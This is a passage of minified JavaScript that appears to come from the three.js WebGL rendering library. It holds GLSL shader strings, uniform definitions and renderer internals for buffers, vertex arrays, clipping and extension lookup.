clearcoat;\n\tuniform float clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tuniform vec3 sheen;\n#endif\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <bsdfs>\n#include <cube_uv_reflection_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_physical_pars_fragment>\n#include <fog_pars_fragment>\n#include <lights_pars_begin>\n#include <lights_physical_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <clearcoat_normalmap_pars_fragment>\n#include <roughnessmap_pars_fragment>\n#include <metalnessmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <roughnessmap_fragment>\n\t#include <metalnessmap_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <clearcoat_normal_fragment_begin>\n\t#include <clearcoat_normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_physical_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\n\t#ifdef TRANSPARENCY\n\t\tdiffuseColor.a *= saturate( 1. - transparency + linearToRelativeLuminance( reflectedLight.directSpecular + reflectedLight.indirectSpecular ) );\n\t#endif\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshphysical_vert:"#define STANDARD\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",normal_frag:"#define NORMAL\nuniform float opacity;\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <packing>\n#include <uv_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\t#include <logdepthbuf_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tgl_FragColor = vec4( packNormalToRGB( normal ), opacity );\n}",normal_vert:"#define NORMAL\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvarying vec3 vViewPosition;\n#endif\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n\t#ifdef USE_TANGENT\n\t\tvarying vec3 vTangent;\n\t\tvarying vec3 vBitangent;\n\t#endif\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n\t#ifdef USE_TANGENT\n\t\tvTangent = normalize( transformedTangent );\n\t\tvBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );\n\t#endif\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( TANGENTSPACE_NORMALMAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif\n}",points_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <color_pars_fragment>\n#include <map_particle_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_particle_fragment>\n\t#include <color_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <premultiplied_alpha_fragment>\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",points_vert:"uniform float size;\nuniform float scale;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\tgl_PointSize = size;\n\t#ifdef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );\n\t#endif\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <fog_vertex>\n}",shadow_frag:"uniform vec3 color;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\nvoid main() {\n\tgl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );\n\t#include <fog_fragment>\n}",shadow_vert:"#include <fog_pars_vertex>\n#include <shadowmap_pars_vertex>\nvoid main() {\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",sprite_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#include <common>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n}",sprite_vert:"uniform float rotation;\nuniform vec2 center;\n#include <common>\n#include <uv_pars_vertex>\n#include <fog_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\tvec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\n\tvec2 scale;\n\tscale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );\n\tscale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );\n\t#ifndef USE_SIZEATTENUATION\n\t\tbool isPerspective = isPerspectiveMatrix( projectionMatrix );\n\t\tif ( isPerspective ) scale *= - mvPosition.z;\n\t#endif\n\tvec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;\n\tvec2 rotatedPosition;\n\trotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\n\trotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\n\tmvPosition.xy += rotatedPosition;\n\tgl_Position = projectionMatrix * mvPosition;\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}"},ii={common:{diffuse:{value:new Ne(15658734)},opacity:{value:1},map:{value:null},uvTransform:{value:new x},alphaMap:{value:null}},specularmap:{specularMap:{value:null}},envmap:{envMap:{value:null},flipEnvMap:{value:-1},reflectivity:{value:1},refractionRatio:{value:.98},maxMipLevel:{value:0}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1}},emissivemap:{emissiveMap:{value:null}},bumpmap:{bumpMap:{value:null},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalScale:{value:new f(1,1)}},displacementmap:{displacementMap:{value:null},displacementScale:{value:1},displacementBias:{value:0}},roughnessmap:{roughnessMap:{value:null}},metalnessmap:{metalnessMap:{value:null}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new Ne(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{}}},spotShadowMap:{value:[]},spotShadowMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{},shadow:{},shadowBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}}},points:{diffuse:{value:new Ne(15658734)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},uvTransform:{value:new x}},sprite:{diffuse:{value:new Ne(15658734)},opacity:{value:1},center:{value:new f(.5,.5)},rotation:{value:0},map:{value:null},alphaMap:{value:null},uvTransform:{value:new x}}},ni={basic:{uniforms:jt([ii.common,ii.specularmap,ii.envmap,ii.aomap,ii.lightmap,ii.fog]),vertexShader:ti.meshbasic_vert,fragmentShader:ti.meshbasic_frag},lambert:{uniforms:jt([ii.common,ii.specularmap,ii.envmap,ii.aomap,ii.lightmap,ii.emissivemap,ii.fog,ii.lights,{emissive:{value:new Ne(0)}}]),vertexShader:ti.meshlambert_vert,fragmentShader:ti.meshlambert_frag},phong:{uniforms:jt([ii.common,ii.specularmap,ii.envmap,ii.aomap,ii.lightmap,ii.emissivemap,ii.bumpmap,ii.normalmap,ii.displacementmap,ii.gradientmap,ii.fog,ii.lights,{emissive:{value:new Ne(0)},specular:{value:new Ne(1118481)},shininess:{value:30}}]),vertexShader:ti.meshphong_vert,fragmentShader:ti.meshphong_frag},standard:{uniforms:jt([ii.common,ii.envmap,ii.aomap,ii.lightmap,ii.emissivemap,ii.bumpmap,ii.normalmap,ii.displacementmap,ii.roughnessmap,ii.metalnessmap,ii.fog,ii.lights,{emissive:{value:new Ne(0)},roughness:{value:.5},metalness:{value:.5},envMapIntensity:{value:1}}]),vertexShader:ti.meshphysical_vert,fragmentShader:ti.meshphysical_frag},matcap:{uniforms:jt([ii.common,ii.bumpmap,ii.normalmap,ii.displacementmap,ii.fog,{matcap:{value:null}}]),vertexShader:ti.meshmatcap_vert,fragmentShader:ti.meshmatcap_frag},points:{uniforms:jt([ii.points,ii.fog]),vertexShader:ti.points_vert,fragmentShader:ti.points_frag},dashed:{uniforms:jt([ii.common,ii.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:ti.linedashed_vert,fragmentShader:ti.linedashed_frag},depth:{uniforms:jt([ii.common,ii.displacementmap]),vertexShader:ti.depth_vert,fragmentShader:ti.depth_frag},normal:{uniforms:jt([ii.common,ii.bumpmap,ii.normalmap,ii.displacementmap,{opacity:{value:1}}]),vertexShader:ti.normal_vert,fragmentShader:ti.normal_frag},sprite:{uniforms:jt([ii.sprite,ii.fog]),vertexShader:ti.sprite_vert,fragmentShader:ti.sprite_frag},background:{uniforms:{uvTransform:{value:new x},t2D:{value:null}},vertexShader:ti.background_vert,fragmentShader:ti.background_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:ti.cube_vert,fragmentShader:ti.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:ti.equirect_vert,fragmentShader:ti.equirect_frag},distanceRGBA:{uniforms:jt([ii.common,ii.displacementmap,{referencePosition:{value:new y},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:ti.distanceRGBA_vert,fragmentShader:ti.distanceRGBA_frag},shadow:{uniforms:jt([ii.lights,ii.fog,{color:{value:new Ne(0)},opacity:{value:1}}]),vertexShader:ti.shadow_vert,fragmentShader:ti.shadow_frag}};function ri(){var e=null,t=!1,i=null;function n(r,o){!1!==t&&(i(r,o),e.requestAnimationFrame(n))}return{start:function(){!0!==t&&null!==i&&(e.requestAnimationFrame(n),t=!0)},stop:function(){t=!1},setAnimationLoop:function(e){i=e},setContext:function(t){e=t}}}function oi(e){var t=new WeakMap;return{get:function(e){return e.isInterleavedBufferAttribute&&(e=e.data),t.get(e)},remove:function(i){i.isInterleavedBufferAttribute&&(i=i.data);var n=t.get(i);n&&(e.deleteBuffer(n.buffer),t.delete(i))},update:function(i,n){i.isInterleavedBufferAttribute&&(i=i.data);var r=t.get(i);void 0===r?t.set(i,function(t,i){var n=t.array,r=t.usage,o=e.createBuffer();e.bindBuffer(i,o),e.bufferData(i,n,r),t.onUploadCallback();var a=5126;return n instanceof Float32Array?a=5126:n instanceof Float64Array?console.warn("THREE.WebGLAttributes: Unsupported data buffer format: Float64Array."):n instanceof Uint16Array?a=5123:n instanceof Int16Array?a=5122:n instanceof Uint32Array?a=5125:n instanceof Int32Array?a=5124:n instanceof Int8Array?a=5120:n instanceof Uint8Array&&(a=5121),{buffer:o,type:a,bytesPerElement:n.BYTES_PER_ELEMENT,version:t.version}}(i,n)):r.version<i.version&&(!function(t,i,n){var r=i.array,o=i.updateRange;e.bindBuffer(n,t),-1===o.count?e.bufferSubData(n,0,r):(e.bufferSubData(n,o.offset*r.BYTES_PER_ELEMENT,r.subarray(o.offset,o.offset+o.count)),o.count=-1)}(r.buffer,i,n),r.version=i.version)}}}function ai(e,t,i,n){zt.call(this),this.type="PlaneGeometry",this.parameters={width:e,height:t,widthSegments:i,heightSegments:n},this.fromBufferGeometry(new si(e,t,i,n)),this.mergeVertices()}function si(e,t,i,n){dt.call(this),this.type="PlaneBufferGeometry",this.parameters={width:e,height:t,widthSegments:i,heightSegments:n};var r,o,a=(e=e||1)/2,s=(t=t||1)/2,c=Math.floor(i)||1,l=Math.floor(n)||1,h=c+1,u=l+1,d=e/c,p=t/l,f=[],m=[],v=[],g=[];for(o=0;o<u;o++){var y=o*p-s;for(r=0;r<h;r++){var b=r*d-a;m.push(b,-y,0),v.push(0,0,1),g.push(r/c),g.push(1-o/l)}}for(o=0;o<l;o++)for(r=0;r<c;r++){var w=r+h*o,x=r+h*(o+1),_=r+1+h*(o+1),M=r+1+h*o;f.push(w,x,M),f.push(x,_,M)}this.setIndex(f),this.addAttribute("position",new tt(m,3)),this.addAttribute("normal",new tt(v,3)),this.addAttribute("uv",new tt(g,2))}function ci(e,t,i,n){var r,o,a=new Ne(0),s=0,c=null,l=0;function h(e,i){t.buffers.color.setClear(e.r,e.g,e.b,i,n)}return{getClearColor:function(){return a},setClearColor:function(e,t){a.set(e),h(a,s=void 0!==t?t:1)},getClearAlpha:function(){return s},setClearAlpha:function(e){h(a,s=e)},render:function(t,n,u,d){var p=n.background,f=e.vr,m=f.getSession&&f.getSession();if(m&&"additive"===m.environmentBlendMode&&(p=null),null===p?(h(a,s),c=null,l=0):p&&p.isColor&&(h(p,1),d=!0,c=null,l=0),(e.autoClear||d)&&e.clear(e.autoClearColor,e.autoClearDepth,e.autoClearStencil),p&&(p.isCubeTexture||p.isWebGLRenderTargetCube)){void 0===o&&((o=new Lt(new Ft(1,1,1),new Vt({type:"BackgroundCubeMaterial",uniforms:Nt(ni.cube.uniforms),vertexShader:ni.cube.vertexShader,fragmentShader:ni.cube.fragmentShader,side:1,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.removeAttribute("normal"),o.geometry.removeAttribute("uv"),o.onBeforeRender=function(e,t,i){this.matrixWorld.copyPosition(i.matrixWorld)},Object.defineProperty(o.material,"map",{get:function(){return this.uniforms.tCube.value}}),i.update(o));var v=p.isWebGLRenderTargetCube?p.texture:p;o.material.uniforms.tCube.value=v,o.material.uniforms.tFlip.value=p.isWebGLRenderTargetCube?1:-1,c===p&&l===v.version||(o.material.needsUpdate=!0,c=p,l=v.version),t.unshift(o,o.geometry,o.material,0,0,null)}else p&&p.isTexture&&(void 0===r&&((r=new Lt(new si(2,2),new Vt({type:"BackgroundMaterial",uniforms:Nt(ni.background.uniforms),vertexShader:ni.background.vertexShader,fragmentShader:ni.background.fragmentShader,side:0,depthTest:!1,depthWrite:!1,fog:!1}))).geometry.removeAttribute("normal"),Object.defineProperty(r.material,"map",{get:function(){return this.uniforms.t2D.value}}),i.update(r)),r.material.uniforms.t2D.value=p,!0===p.matrixAutoUpdate&&p.updateMatrix(),r.material.uniforms.uvTransform.value.copy(p.matrix),c===p&&l===p.version||(r.material.needsUpdate=!0,c=p,l=p.version),t.unshift(r,r.geometry,r.material,0,0,null))}}}function li(e,t,i,n){var r=e.getParameter(34921),o=n.isWebGL2?null:t.get("OES_vertex_array_object"),a=n.isWebGL2||null!==o,s={},c=d(null),l=c;function h(t){return n.isWebGL2?e.bindVertexArray(t):o.bindVertexArrayOES(t)}function u(t){return n.isWebGL2?e.deleteVertexArray(t):o.deleteVertexArrayOES(t)}function d(e){for(var t=[],i=[],n=[],o=0;o<r;o++)t[o]=0,i[o]=0,n[o]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:t,enabledAttributes:i,attributeDivisors:n,object:e,attributes:{}}}function p(){for(var e=l.newAttributes,t=0,i=e.length;t<i;t++)e[t]=0}function f(e){m(e,0)}function m(i,r){var o=l.newAttributes,a=l.enabledAttributes,s=l.attributeDivisors;(o[i]=1,0===a[i]&&(e.enableVertexAttribArray(i),a[i]=1),s[i]!==r)&&((n.isWebGL2?e:t.get("ANGLE_instanced_arrays"))[n.isWebGL2?"vertexAttribDivisor":"vertexAttribDivisorANGLE"](i,r),s[i]=r)}function v(){for(var t=l.newAttributes,i=l.enabledAttributes,n=0,r=i.length;n<r;n++)i[n]!==t[n]&&(e.disableVertexAttribArray(n),i[n]=0)}function g(){y(),l!==c&&h((l=c).object)}function y(){c.geometry=null,c.program=null,c.wireframe=!1}return{setup:function(r,c,u,g){var y=!1;if(a){var b=function(t,i,r){var a=!0===r.wireframe,c=s[t.id];void 0===c&&(c={},s[t.id]=c);var l=c[i.id];void 0===l&&(l={},c[i.id]=l);var h=l[a];void 0===h&&(h=d(n.isWebGL2?e.createVertexArray():o.createVertexArrayOES()),l[a]=h);return h}(u,c,r);l!==b&&h((l=b).object),(y=function(e){var t=l.attributes,i=e.attributes;if(Object.keys(t).length!==Object.keys(i).length)return!0;for(var n in i){var r=t[n],o=i[n];if(r.attribute!==o)return!0;if(r.version!==o.versionVAO)return!0;if(r.data.buffer!==o.data)return!0;if(o.data&&r.data.version!==o.data.versionVAO)return!0}return!1}(u))&&function(e){var t={},i=e.attributes;for(var n in i){var r=i[n],o={};o.attribute=r,o.version=r.versionVAO,o.data={},r.data&&(o.data.buffer=r.data,o.data.version=r.data.versionVAO),t[n]=o}l.attributes=t}(u)}else{var w=!0===r.wireframe;l.geometry===u.id&&l.program===c.id&&l.wireframe===w||(l.geometry=u.id,l.program=c.id,l.wireframe=w,y=!0)}null!==g&&i.update(g,34963),y&&(!function(r,o,a){if(a&&a.isInstancedBufferGeometry&!n.isWebGL2&&null===t.get("ANGLE_instanced_arrays"))return void console.error("THREE.WebGLRenderer.setupVertexAttributes: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");p();var s=a.attributes,c=o.getAttributes(),l=r.defaultAttributeValues;for(var h in c){var u=c[h];if(u>=0){var d=s[h];if(void 0!==d){var g=d.normalized,y=d.itemSize,b=i.get(d);if(void 0===b)continue;var w=b.buffer,x=b.type,_=b.bytesPerElement;if(d.isInterleavedBufferAttribute){var M=d.data,S=M.stride,T=d.offset;M&&M.isInstancedInterleavedBuffer?(m(u,M.meshPerAttribute),void 0===a.maxInstancedCount&&(a.maxInstancedCount=M.meshPerAttribute*M.count)):f(u),e.bindBuffer(34962,w),e.vertexAttribPointer(u,y,x,g,S*_,T*_)}else d.isInstancedBufferAttribute?(m(u,d.meshPerAttribute),void 0===a.maxInstancedCount&&(a.maxInstancedCount=d.meshPerAttribute*d.count)):f(u),e.bindBuffer(34962,w),e.vertexAttribPointer(u,y,x,g,0,0)}else if(void 0!==l){var E=l[h];if(void 0!==E)switch(E.length){case 2:e.vertexAttrib2fv(u,E);break;case 3:e.vertexAttrib3fv(u,E);break;case 4:e.vertexAttrib4fv(u,E);break;default:e.vertexAttrib1fv(u,E)}}}}v()}(r,c,u),null!==g&&e.bindBuffer(34963,i.get(g).buffer))},reset:g,resetDefaultState:y,dispose:function(){for(var e in g(),s){var t=s[e];for(var i in t){var n=t[i];for(var r in n)u(n[r].object),delete n[r];delete t[i]}delete s[e]}},releaseStatesOfGeometry:function(e){if(void 0!==s[e.id]){var t=s[e.id];for(var i in t){var n=t[i];for(var r in n)u(n[r].object),delete n[r];delete t[i]}delete s[e.id]}},releaseStatesOfProgram:function(e){for(var t in s){var i=s[t];if(void 0!==i[e.id]){var n=i[e.id];for(var r in n)u(n[r].object),delete n[r];delete i[e.id]}}},initAttributes:p,enableAttribute:f,disableUnusedAttributes:v}}function hi(e,t,i,n){var r,o=n.isWebGL2;this.setMode=function(e){r=e},this.render=function(t,n){e.drawArrays(r,t,n),i.update(n,r)},this.renderInstances=function(n,a,s,c){if(0!==c){var l,h;if(o)l=e,h="drawArraysInstanced";else if(h="drawArraysInstancedANGLE",null===(l=t.get("ANGLE_instanced_arrays")))return void console.error("THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");l[h](r,a,s,c),i.update(s,r,c)}}}function ui(e,t,i){var n;function r(t){if("highp"===t){if(e.getShaderPrecisionFormat(35633,36338).precision>0&&e.getShaderPrecisionFormat(35632,36338).precision>0)return"highp";t="mediump"}return"mediump"===t&&e.getShaderPrecisionFormat(35633,36337).precision>0&&e.getShaderPrecisionFormat(35632,36337).precision>0?"mediump":"lowp"}var o="undefined"!=typeof WebGL2RenderingContext&&e instanceof WebGL2RenderingContext,a=void 0!==i.precision?i.precision:"highp",s=r(a);s!==a&&(console.warn("THREE.WebGLRenderer:",a,"not supported, using",s,"instead."),a=s);var c=!0===i.logarithmicDepthBuffer,l=e.getParameter(34930),h=e.getParameter(35660),u=e.getParameter(3379),d=e.getParameter(34076),p=e.getParameter(34921),f=e.getParameter(36347),m=e.getParameter(36348),v=e.getParameter(36349),g=h>0,y=o||!!t.get("OES_texture_float");return{isWebGL2:o,getMaxAnisotropy:function(){if(void 0!==n)return n;var i=t.get("EXT_texture_filter_anisotropic");return n=null!==i?e.getParameter(i.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0},getMaxPrecision:r,precision:a,logarithmicDepthBuffer:c,maxTextures:l,maxVertexTextures:h,maxTextureSize:u,maxCubemapSize:d,maxAttributes:p,maxVertexUniforms:f,maxVaryings:m,maxFragmentUniforms:v,vertexTextures:g,floatFragmentTextures:y,floatVertexTextures:g&&y,maxSamples:o?e.getParameter(36183):0}}function di(){var e=this,t=null,i=0,n=!1,r=!1,o=new $t,a=new x,s={value:null,needsUpdate:!1};function c(){s.value!==t&&(s.value=t,s.needsUpdate=i>0),e.numPlanes=i,e.numIntersection=0}function l(t,i,n,r){var c=null!==t?t.length:0,l=null;if(0!==c){if(l=s.value,!0!==r||null===l){var h=n+4*c,u=i.matrixWorldInverse;a.getNormalMatrix(u),(null===l||l.length<h)&&(l=new Float32Array(h));for(var d=0,p=n;d!==c;++d,p+=4)o.copy(t[d]).applyMatrix4(u,a),o.normal.toArray(l,p),l[p+3]=o.constant}s.value=l,s.needsUpdate=!0}return e.numPlanes=c,l}this.uniform=s,this.numPlanes=0,this.numIntersection=0,this.init=function(e,r,o){var a=0!==e.length||r||0!==i||n;return n=r,t=l(e,o,0),i=e.length,a},this.beginShadows=function(){r=!0,l(null)},this.endShadows=function(){r=!1,c()},this.setState=function(e,o,a,h,u,d){if(!n||null===e||0===e.length||r&&!a)r?l(null):c();else{var p=r?0:i,f=4*p,m=u.clippingState||null;s.value=m,m=l(e,h,f,d);for(var v=0;v!==f;++v)m[v]=t[v];u.clippingState=m,this.numIntersection=o?this.numPlanes:0,this.numPlanes+=p}}}function pi(e){var t={};return{get:function(i){if(void 0!==t[i])return t[i];var n;switch(i){case"WEBGL_depth_texture":n=e.getExtension("WEBGL_depth_texture")||e.getExtension("MOZ_WEBGL_depth_texture")||e.getExtension("WEBKIT_WEBGL_depth_texture");break;case"EXT_texture_filter_anisotropic":n=e.getExtension("EXT_texture_filter_anisotropic")||e.getExtension("MOZ_EXT_texture_filter_anisotropic")||e.getExtension("WEBKIT_EXT_texture_filter_anisotropic");break;case"WEBGL_compressed_texture_s3tc":n=e.getExtension("WEBGL_compressed_texture_s3tc")||e.getExtension("MOZ_WEBGL_compressed_texture_s3tc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");break;case"WEBGL_compressed_texture_pvrtc":n=e.getExtension("WEBGL_compressed_texture_pvrtc")||e.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");break;default:n=e.getExtension(i)}return null===n&&console.warn("THREE.WebGLRenderer: "+i+" extension not supported."),t[i]=n,n}}}function fi(e,t,i,n){var r=new WeakMap,o=new WeakMap;function a(e){var s=e.target,c=r.get(s);for(var l in null!==c.index&&t.remove(c.index),c.attributes)t.remove(c.attributes[l]);s.removeEventListener("dispose",a),r.delete(s);var h=o.get(c);h&&(t.remove(h),o.delete(c)),n.releaseStatesOfGeometry(s),i.memory.geometries--}function s(e){var i=[],n=e.index,r=e.attributes.position,a=0;if(null!==n){var s=n.array;a=n.version;for(var c=0,l=s.length;c<l;c+=3){var h=s[c+0],u=s[c+1],d=s[c+2];i.push(h,u,u,d,d,h)}}else{s=r.array;a=r.version;for(c=0,l=s.length/3-1;c<l;c+=3){h=c+0,u=c+1,d=c+2;i.push(h,u,u,d,d,h)}}var p=new(rt(i)>65535?et:Je)(i,1);p.version=a;var f=o.get(e);f&&t.remove(f),o.set(e,p)}return{get:function(e,t){var n=r.get(t);return n||(t.addEventListener("dispose",a),t.isBufferGeometry?n=t:t.isGeometry&&(void 0===t._bufferGeometry&&(t._bufferGeometry=(new dt).setFromObject(e)),n=t._bufferGeometry),r.set(t,n),i.memory.geometries++,n)},update:function(e){var i=e.attributes;for(var n in 